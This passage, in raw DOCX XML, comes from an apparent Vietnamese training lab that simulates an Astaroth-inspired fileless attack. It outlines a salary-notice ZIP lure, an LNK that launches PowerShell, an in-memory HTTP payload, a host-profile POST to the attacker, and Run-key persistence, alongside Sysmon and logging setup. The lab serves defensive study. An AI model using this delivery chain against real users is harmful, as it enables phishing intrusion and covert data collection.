      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ThongBaoLuong_Q3.zip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý nghĩa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: payload vô hại, thu thập profile máy không nhạy cảm, offline staging và mô phỏng persistence/retry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>collect_server.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: web server kiêm collector nhận JSON profile từ victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>create_lnk.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: script tạo shortcut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: launcher mà victim sẽ mở sau khi giải nén ZIP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: gói giả lập tài liệu mồi nhử để victim tải về.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. Kiểm tra kết nối mạng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ipconfig</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ping 192.168.141.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên attacker:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ipconfig</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python --version</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nếu victim ping được attacker và attacker có Python, có thể chuyển sang file hướng dẫn thực hiện lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Checklist chuẩn bị</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Victim là Windows VM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Đã tạo snapshot cho victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Attacker có IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Victim có IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.140</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Hai máy ping được nhau.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Attacker có Python 3.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Victim đã cài Sysmon.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Victim đã bật PowerShell Script Block Logging.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Victim đã bật Process Creation Audit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Nếu cần, victim đã cài/bật được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Victim đã bật hiển thị file extension.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Attacker đã có thư mục </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t>02 - Thực hiện lab Astaroth-inspired trên 2 máy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Mục tiêu bài lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bài lab mô phỏng một chiến dịch Astaroth-inspired theo hướng an toàn, lấy cảm hứng từ đặc trưng Living-off-the-Land, in-memory execution, thu thập thông tin máy nạn nhân và persistence của Astaroth.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Khác với phiên bản lab cũ, payload trong bài lab này không được tải xuống ổ đĩa của máy nạn nhân dưới dạng file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> hay file mã hóa trung gian. Victim chỉ có ZIP và LNK đóng vai trò delivery/launcher. Nội dung payload được PowerShell tải qua HTTP, giữ trong biến và thực thi bằng ScriptBlock trong bộ nhớ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chuỗi mong muốn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Victim tải ZIP</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; giải nén</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; click ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; LNK gọi powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; PowerShell kết nối máy attacker</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; nhận nội dung payload.ps1 qua HTTP</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; payload nằm trong RAM</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; PowerShell thực thi payload trực tiếp</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; thu thập thông tin máy không nhạy cảm</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; gửi JSON profile về attacker qua POST /collect trên port 8001</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; tạo Registry Run key vô hại để mô phỏng persistence</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; không hiển thị kết quả rõ ràng cho victim</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; attacker xác nhận thành công bằng file JSON nhận được</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Người dùng chỉ thực hiện:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Download ZIP</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; Extract</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; Double click LNK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Toàn bộ phần còn lại diễn ra tự động sau cú double-click.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Phạm vi và giới hạn an toàn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lab có mô phỏng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Social engineering giả lập.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">File shortcut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>HTTP download.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>In-memory execution.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Thu thập thông tin máy không nhạy cảm.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Gửi kết quả mô phỏng về attacker trong mạng lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Registry Run key persistence vô hại.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sysmon logging.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell Script Block Logging.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lab không mô phỏng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>DLL injection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Process injection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Alternate Data Streams.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Credential theft.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>C2 thật.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Obfuscation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>AV bypass.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Privilege escalation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload chỉ thu thập thông tin hệ thống cơ bản như hostname, username, OS version, IP nội bộ và PowerShell version. Lab không thu thập password, cookie, token, clipboard, browser data hoặc tài liệu cá nhân.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
